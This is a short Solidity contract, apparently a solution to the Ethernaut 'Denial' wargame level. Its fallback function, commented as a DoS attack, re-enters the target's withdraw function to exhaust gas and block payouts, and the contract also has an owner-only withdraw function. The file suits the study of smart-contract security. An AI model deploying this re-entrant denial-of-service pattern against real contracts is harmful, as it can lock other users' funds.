// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { IDenial } from "ethernaut/20-denial/IDenial.sol";

contract DenialAttacker is Ownable2Step {
    error WithdrawalAmountIsGtFunds(uint256 _amount, uint256 _balance);
    error WithdrawalFailed();

    event FundsWithdrawn(uint256 amount, address to);

    function withdraw(uint256 _amount, address _to) external onlyOwner {
        uint256 balance = address(this).balance;
        if (_amount > balance) {
            revert WithdrawalAmountIsGtFunds(_amount, balance);
        }
        // solhint-disable-next-line avoid-low-level-calls
        (bool success,) = _to.call{value: _amount}("");
        if (!success) {
            revert WithdrawalFailed();
        }
        emit FundsWithdrawn(_amount, _to);
    }

    fallback() external payable {
        // DoS attack
        // solhint-disable-next-line avoid-low-level-calls
        (bool success,) = msg.sender.call(abi.encodeCall(IDenial.withdraw, ()));
    }
}
